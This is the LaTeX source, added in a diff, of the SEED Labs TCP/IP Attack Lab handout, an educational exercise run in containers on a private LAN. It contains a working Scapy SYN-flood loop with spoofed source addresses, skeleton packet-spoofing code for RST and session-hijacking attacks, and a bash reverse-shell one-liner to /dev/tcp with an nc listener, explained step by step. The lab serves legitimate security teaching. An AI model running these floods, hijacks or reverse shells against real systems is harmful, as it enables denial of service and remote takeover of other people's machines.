@@ -1,0 +1,636 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  Copyright by Wenliang Du.                                       %%
+%%  This work is licensed under the Creative Commons                %%
+%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
+%%  To view a copy of this license, visit                           %%
+%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\newcommand{\commonfolder}{../../common-files}
+
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
+
+
+\newcommand{\telnet} {\texttt{telnet}\xspace}
+\newcommand{\tcpFigs}{./Figs}
+
+\lhead{\bfseries SEED Labs -- TCP/IP Attack Lab}
+
+\begin{document}
+
+\newcounter{task}
+\setcounter{task}{1}
+\newcommand{\mytask} {\bf {\noindent \arabic{task}} \addtocounter{task}{1} \,}
+
+
+
+\begin{center}
+{\LARGE TCP/IP Attack Lab}
+\end{center}
+
+\seedlabcopyright{2018 - 2020}
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Overview}
+
+
+The learning objective of this lab is for students to gain first-hand
+experience on vulnerabilities, as well as on attacks against these
+vulnerabilities. Wise people learn from mistakes. In security education, we
+study mistakes that lead to software vulnerabilities. Studying mistakes
+from the past not only help students understand why systems are vulnerable,
+why a seemly-benign mistake can turn into a disaster, and why many
+security mechanisms are needed. More importantly, it also helps students
+learn the common patterns of vulnerabilities, so they can avoid making
+similar mistakes in the future. Moreover, using vulnerabilities as case
+studies, students can learn the principles of secure design, secure
+programming, and security testing.
+
+The vulnerabilities in the TCP/IP protocols represent a special genre of
+vulnerabilities in protocol designs and implementations; they provide an
+invaluable lesson as to why security should be designed in from the
+beginning, rather than being added as an afterthought. Moreover, studying
+these vulnerabilities help students understand the challenges of network
+security and why many network security measures are needed.
+In this lab, students will conduct several attacks on TCP.
+This lab covers the following topics:
+
+\begin{itemize}[noitemsep]
+\item The TCP protocol
+\item TCP SYN flood attack, and SYN cookies 
+\item TCP reset attack
+\item TCP session hijacking attack
+\item Reverse shell 
+\item A special type of TCP attack, the Mitnick attack, is covered 
+in a separate lab. 
+\end{itemize}
+
+
+\paragraph{Readings and videos.}
+Detailed coverage of the TCP attacks can be found in the following:
+
+\begin{itemize}
+\item Chapter 16 of the SEED Book, \seedbook
+\item Section 6 of the SEED Lecture, \seedisvideo
+\end{itemize}
+
+
+\paragraph{Lab environment.} \seedenvironmentC
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Lab Environment}
+
+
+In this lab, we need to have at least three machines. We use 
+containers to set up the lab environment. Figure~\ref{tcp:fig:labsetup}
+depicts the lab setup. 
+We will use the attacker container to launch attacks, while using the other 
+three containers as the victim and user machines. 
+We assume all these machines are on the same LAN. 
+Students can also use three virtual machines for this lab, 
+but it will be much more convenient to use containers. 
+
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=0.8\textwidth]{\commonfolder/Figs/OneLan.pdf}
+\end{center}
+\caption{Lab environment setup}
+\label{tcp:fig:labsetup}
+\end{figure}
+ 
+
+%\begin{lstlisting}[backgroundcolor=]
+%  +------------+      +------------+  +------------+  +------------+
+%  |  Attacker  |      |   Victim   |  |    User 1  |  |   User 2   |
+%  |  10.9.0.1  |      |  10.9.0.5  |  |  10.9.0.6  |  |  10.9.0.7  |
+%  +----+-------+      +------+-----+  +------+-----+  +------+-----+
+%       |                     | eth0          | eth0          | eth0
+%       |                     |               |               |
+%-------+---------------------+---------------+---------------+-------
+%           Network  10.9.0.0/24
+%
+%\end{lstlisting}
+ 
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Container Setup and Commands}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/container/setup}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+ 
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{About the Attacker Container}
+
+In this lab, we can either use the VM or the attacker container
+as the attacker machine. If you look at the Docker Compose file, you will
+see that the attacker container is configured differently from the other
+containers.
+
+
+\begin{itemize}
+\item \textit{Shared folder.} When we use the attacker container
+to launch attacks, we need to put the attacking code inside
+the attacker container.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/container/volumes}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\item \textit{Host mode.}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/container/host_mode}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\end{itemize}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%\input{\commonfolder/container_interface}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{The seed Account} 
+
+In this lab, we need to telnet from one containter to another. 
+We have already created an account called \texttt{seed} inside all
+the containers.
+Its password is \texttt{dees}. You can telnet into this account.  
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Lab Tasks}
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection {Task 1: SYN Flooding Attack}
+
+
+\begin{figure}[htb]
+  \begin{center}
+    \includegraphics[width=0.9\textwidth]{\tcpFigs/TCP_SYN_Flooding.pdf}
+  \end{center}
+  \caption{SYN Flooding Attack}
+  \label{tcp:fig:synflooding}
+\end{figure}
+ 
+
+
+SYN flood is a form of DoS attack in which attackers send many SYN
+requests to a victim's TCP port, but the attackers have no intention 
+to finish the 3-way handshake procedure. Attackers either use spoofed 
+IP address or do not continue the procedure. 
+Through this attack, attackers can flood the victim's queue that is 
+used for half-opened connections, i.e. the connections that has finished SYN, SYN-ACK, 
+but has not yet gotten a final ACK back. When this queue is full, 
+the victim cannot take any more connection. Figure~\ref{tcp:fig:synflooding}
+illustrates the attack.
+
+The size of the queue has a system-wide setting.  In Ubuntu OSes, we can check the
+setting using the following command: 
+
+\begin{lstlisting}
+# sysctl -q net.ipv4.tcp_max_syn_backlog
+net.ipv4.tcp_max_syn_backlog = 128
+\end{lstlisting}
+
+We can use command \texttt{"netstat -nat"} to check the usage of the queue, 
+i.e., the number of half-opened connection associated with a listening port. 
+The state for such connections is \texttt {SYN-RECV}. If the 3-way handshake
+is finished, the state of the connections will be {\tt ESTABLISHED}.
+
+
+\paragraph{SYN Cookie Countermeasure:}
+By default, Ubuntu's SYN flooding countermeasure is turned on. This 
+mechanism is called SYN cookie. It will kick in if the machine
+detects that it is under the SYN flooding attack.
+We can use the {\tt sysctl} command to turn on/off the SYN 
+cookie mechanism:
+
+\begin{lstlisting}
+$ sudo sysctl -a | grep syncookies     (Display the SYN cookie flag) 
+$ sudo sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
+$ sudo sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
+\end{lstlisting}
+
+The commands above only work inside the VM.  
+Inside the provided container, we will not be able to change 
+the SYN cookie flag. If we run the command, 
+we will see the following error message. The container
+is not given the privilege to make the change. 
+
+\begin{lstlisting}
+# sysctl -w net.ipv4.tcp_syncookies=1
+sysctl: setting key "net.ipv4.tcp_syncookies": Read-only file system
+\end{lstlisting}
+
+If we want to turn off the SYN cookie in a container, 
+we have to do it when we build the container. 
+That is why we added the following entry
+to the \texttt{docker-compose.yml} file:  
+
+\begin{lstlisting}
+sysctls:
+      - net.ipv4.tcp_syncookies=0
+\end{lstlisting}
+
+ 
+
+
+\paragraph{Launching the attack.}
+We provide a C program called \texttt{synflood.c}. Students can compile
+the program on the VM and then launch the attack on the target machine:
+
+\begin{lstlisting}
+// Compile the code on the host VM
+$ gcc -o synflood synflood.c
+
+// Launch the attack from the attacker container
+# synflood 10.9.0.5 23
+\end{lstlisting}
+ 
+
+While the attack is going on, 
+run the \texttt{"netstat -nat"} command on the victim machine, and compare 
+the result with that before the attack. 
+Please go to another machine, try to telnet to the target machine, 
+and describe your observation.
+
+
+\paragraph{An interesting observation.} On Ubuntu 20.04, if machine X
+has never made a telnet to the victim machine, when the SYN flooding 
+attack is launched, machine X will not be able to telnet into the 
+victim machine. However, if before the attack, machine X
+has already made a telnet to the victim machine, then X 
+seems to be ``immune'' to the SYN flooding attack, and can
+successfully telnet to the victim machine during the attack. 
+It seems that the victim machine remembers past successful 
+connections, and uses this memory when establishing
+future connections with the ``returning'' client. 
+This behavior does not exist in Ubuntu 16.04 
+and earlier versions. Some users of the SEED labs
+reported that the memory lasts less than 3 hours, i.e.,
+if you keep doing the attack for 3 hours, the attack
+will eventually be successful.
+
+
+We have not figured out whether this is a countermeasure specifically designed
+for the SYN flooding attack or this is just a side effect caused by
+the optimization in the TCP implementation. During the attack, 
+to clean the victim machine's memory, 
+we can simply reboot the target machine.
+For containers, rebooting is very simple, we 
+just restart it using the following docker command:
+
+\begin{lstlisting}
+$ docker restart <container id>
+\end{lstlisting}
+ 
+
+
+
+\paragraph{Enable the SYN Cookie Countermeasure.}
+Please enable the SYN cookie mechanism, and 
+run your attacks again, and compare the results. 
+
+
+
+\paragraph{Note on using Python + Scapy code:} 
+Although theoretically, we can use Python and Scapy to implement this attack,
+and the code will be much simplified. See the code below. 
+
+\begin{lstlisting}
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+
+a = IP(dst="10.9.0.5")
+b = TCP(sport=1551, dport=23, seq=1551, flags='S')
+pkt = a/b
+
+while True:
+    pkt['IP'].src = str(IPv4Address(getrandbits(32)))
+    send(pkt, verbose = 0)
+\end{lstlisting}
+
+
+However, the attack will not succeed using our lab setup. We now understand
+the reason, but haven't found a good solution yet. The problem is caused by
+the NAT setup in our lab environment. If the victim machine is not 
+behind a NAT server, then this code will work.
+
+
+Any traffic going out of the VM in our lab setup will go through the NAT server
+provided by VirtualBox. For TCP, NAT creates address translation 
+entries based on the SYN packet. 
+In our attack, the SYN packets generated 
+by the attacker did not go through the NAT (both attacker and victims are behind the 
+NAT), so no NAT entry was created. When the victim sends SYN + ACK back to the
+source IP (which is randomly generated by the attacker), this packet will 
+go out through the NAT, but because there is no prior NAT entry
+for this TCP connection, NAT does not know what to do,
+so it sends a TCP RST packet back to the victim. 
+
+RST packets cause the victim to remove the data from the half-open connection
+queue. Therefore, while we are trying fill up this queue with the attack, 
+VirtualBox helps the victim to remove our records from the queue. 
+It becomes a competition between our code and the VirtualBox. 
+Unfortunately, the speed of Python is not enough, so VirtualBox always win.
+C is much faster; that is why our C code will always win the competition. 
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection {Task 2: TCP RST Attacks on \texttt{telnet} Connections}
+
+The TCP RST Attack can terminate an established TCP connection between
+two victims. For example, if there is an established \telnet connection (TCP)
+between two users A and B, attackers can spoof a RST packet from A to B,
+breaking this existing connection. To succeed in this attack, attackers
+need to correctly construct the TCP RST packet. 
+
+In this task, you need to launch a TCP RST attack from the VM 
+to break an existing \telnet connection between A and B, which are 
+containers.  To simplify the lab,
+we assume that the attacker and the victim are on the same LAN,
+i.e., the attacker can observe the TCP traffic between
+A and B.
+
+
+\paragraph{Launching the attack manually.} 
+Please use Scapy to conduct the TCP RST attack. 
+A skeleton code is provided in the following. You need to replace each
+\texttt{@@@@} with an actual value (you can get them using Wireshark):  
+
+
+\begin{lstlisting}
+#!/usr/bin/env python3
+from scapy.all import *
+
+ip  = IP(src="@@@@", dst="@@@@")
+tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
+pkt = ip/tcp
+ls(pkt)
+send(pkt,verbose=0)
+\end{lstlisting}
+
+\paragraph{Optional: Launching the attack automatically.} 
+Students are encouraged to write a program to launch the 
+attack automatically using the sniffing-and-spoofing technique. 
+Unlike the manual approach, we get all the parameters
+from sniffed packets, so the entire attack is automated.  
+Please make sure that when you 
+use Scapy's \texttt{sniff} function, don't forget to 
+set the \texttt{iface} argument.  
+
+ 
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\begin{comment}
+% We comment out  this task, because it does not work any more.
+% It seems that the video streaming client will reconnect to the server
+% if the connection is broken. We haven't figured out a solution yet.
+%
+% My fugure plan:
+%    I would like to use container to host our own streeming service.
+%    Then we can launch the RST attack on the server. 
+%    
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection {Task 3: TCP RST Attacks on Video Streaming Applications}
+
+Let us make the TCP RST attack more interesting by experimenting it on 
+the applications that are widely used in nowadays.
+We choose the video streaming application in 
+this task. For this task, you can choose a video streaming web site that you 
+are familiar with (we will not name any specific web site here).  Most of
+video sharing websites establish a TCP connection with the client for 
+streaming the video content. The attacker's goal is to disrupt the TCP session 
+established between the victim and video streaming machine. To 
+simplify the lab, we assume that the attacker and the victim are on the 
+same LAN. In the following, we describe the common interaction between
+a user (the victim) and some video-streaming web site:
+
+\begin{itemize}
+\item The victim browses for a video content in the video-streaming web 
+site, and selects one of the videos for streaming. 
+
+\item Normally video contents are hosted by a different machine,
+where all the video contents are located. After the victim selects 
+a video, a TCP session will be established between the victim 
+machine and the content server for the video streaming.
+The victim can then view the video he/she has selected.
+\end{itemize}
+
+Your task is to disrupt the video streaming by breaking the 
+TCP connection between the victim and the content server.
+You can let the victim user browse the video-streaming 
+site from another (virtual) machine or from the same (virtual) machine
+as the attacker. Please be noted that, to avoid liability issues,
+any attacking packets should be targeted 
+at the victim machine (which is the machine run by yourself), 
+not at the content server machine (which does not belong to you).
+
+\end{comment}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+            
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 3: TCP Session Hijacking}
+
+
+
+\begin{figure}[htb]
+  \begin{center}
+    \includegraphics[width=0.8\textwidth]{\tcpFigs/TCP_Session_Hijacking.pdf}
+  \end{center}
+  \caption{TCP Session Hijacking Attack}
+  \label{tcp:fig:hijacking}
+\end{figure}
+ 
+   
+The objective of the TCP Session Hijacking attack is to hijack an 
+existing TCP connection (session) between two victims by injecting malicious contents
+into this session. If this connection is a \telnet session, attackers
+can inject malicious commands (e.g. deleting an important file) 
+into this session, causing the victims 
+to execute the malicious commands. 
+Figure~\ref{tcp:fig:hijacking} depicts how the attack works.
+In this task, you need to demonstrate how you can hijack a 
+\texttt{telnet} session between two computers. Your goal is to get the
+\texttt{telnet} server to run a malicious command from you.
+For the simplicity of the task, we assume that 
+the attacker and the victim are on the same LAN.
+
+
+\paragraph{Launching the attack manually.}
+Please use Scapy to conduct the TCP Session Hijacking attack.
+A skeleton code is provided in the following. You need to replace each
+\texttt{@@@@} with an actual value; you can use Wireshark to figure out what value you 
+should put into each field of the spoofed TCP packets. 
+
+
+\begin{lstlisting}
+#!/usr/bin/env python3
+from scapy.all import *
+
+ip  = IP(src="@@@@", dst="@@@@")
+tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
+data = "@@@@"
+pkt = ip/tcp/data
+ls(pkt)
+send(pkt,verbose=0)
+\end{lstlisting}
+
+
+\paragraph{Optional: Launching the attack automatically.}
+Students are encouraged to write a program to launch the
+attack automatically using the sniffing-and-spoofing technique.
+Unlike the manual approach, we get all the parameters
+from sniffed packets, so the entire attack is automated.
+Please make sure that when you
+use Scapy's \texttt{sniff} function, don't forget to
+set the \texttt{iface} argument.
+
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 4: Creating Reverse Shell using TCP Session Hijacking}
+
+When attackers are able to inject a command to the victim's machine using
+TCP session hijacking, they are not interested in running one simple
+command on the victim machine; they are interested in running many
+commands. Obviously, running these commands all through TCP session
+hijacking is inconvenient. What attackers want to achieve is to use the
+attack to set up a back door, so they can use this
+back door to conveniently conduct further damages.
+
+A typical way to set up back doors is to run a reverse shell from the
+victim machine to give the attack the shell access to the victim machine.
+Reverse shell is a shell process running on a remote machine, connecting
+back to the attacker's machine. This gives an attacker a convenient way to
+access a remote machine once it has been compromised. 
+
+
+In the following, we will show how we can set up a reverse shell if we can
+directly run a command on the victim machine (i.e. the server machine). 
+In the TCP session hijacking attack, attackers cannot directly run a
+command on the victim machine, so their jobs is to run a reverse-shell
+command through the session hijacking attack. 
+In this task, students need to demonstrate that they can achieve this goal.
+
+
+To have a \texttt{bash} shell on a remote machine connect back to the attacker's machine, the
+attacker needs a process waiting for some connection on a given port. In this example, we will
+use \texttt{netcat}. This program allows us to specify a port
+number and can listen for a connection on that port.
+In the following demo, we show two windows, each one is from a 
+different machine. The top window is the attack machine \texttt{10.9.0.1},  
+which runs \texttt{netcat}~(\texttt{nc} for short), listening on port \texttt{9090}. 
+The bottom window is the victim machine \texttt{10.9.0.5}, and 
+we type the reverse shell command.
+As soon as the reverse shell gets executed, the top window indicates 
+that we get a shell. This is a reverse shell, i.e., it runs on \texttt{10.9.0.5}.  
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[backgroundcolor=]
+           +---------------------------------------------------+ 
+           | (*@\textbf{On 10.9.0.1 (attcker)}@*)                             |
+           |                                                   | 
+           | $ nc -lnv 9090                                    |  
+           | Listening on 0.0.0.0 9090                         |  
+           | Connection received on 10.9.0.5 49382             |  
+           | $   <--+ (*@\textbf{This shell runs on 10.9.0.5}@*)              | 
+           |                                                   |  
+           +---------------------------------------------------+  
+          
+           +---------------------------------------------------+  
+           | (*@\textbf{On 10.9.0.5 (victim)}@*)                              |
+           |                                                   | 
+           |$ /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1  | 
+           |                                                   | 
+           +---------------------------------------------------+
+\end{lstlisting}
+\end{minipage}
+
+We provide a brief description on the reverse shell command in the following.
+Detailed explanation can be found in the SEED book.
+
+\begin{itemize}
+\item \texttt{"/bin/bash -i"}: \texttt{i} stands for interactive, meaning that the shell must be
+  interactive (must provide a shell prompt)
+
+\item \texttt{"> /dev/tcp/10.9.0.1/9090"}: This causes the output (\texttt{stdout}) of the shell
+  to be redirected to the tcp connection to \texttt{10.9.0.1}'s port \texttt{9090}.
+  The output \texttt{stdout} is represented by file descriptor number~1.
+
+\item \texttt{"0<\&1"}: File descriptor 0 represents the standard input (\texttt{stdin}). This causes
+  the  \texttt{stdin} for the shell to be obtained from the tcp connection.
+
+\item \texttt{"2>\&1"}: File descriptor 2 represents standard error \texttt{stderr}. This
+  causes the error output to be redirected to the tcp connection.
+\end{itemize}
+
+In summary, \texttt{"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<\&1 2>\&1"} starts a
+\texttt{bash} shell, with its input coming from a tcp connection, and its standard
+and error outputs being
+redirected to the same tcp connection. 
+
+In the demo shown above, when the \texttt{bash}
+shell command is executed on \texttt{10.9.0.5}, it connects back to the \texttt{netcat} process
+started on \texttt{10.9.0.1}. This is confirmed via the \texttt{"Connection received on 10.9.0.5"}
+message displayed by \texttt{netcat}.
+
+
+The description above shows how you can set up a reverse shell if you have
+the access to the target machine, which is the \texttt{telnet} server in
+our setup, but in this task, you do not have such an access. Your task is 
+to launch an TCP session hijacking attack on an existing \texttt{telnet}
+session between a user and the target server. You need to inject your
+malicious command into the hijacked session, so you can get a reverse
+shell on the target server. 
+
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Lab Report}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/submission}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\end{document}
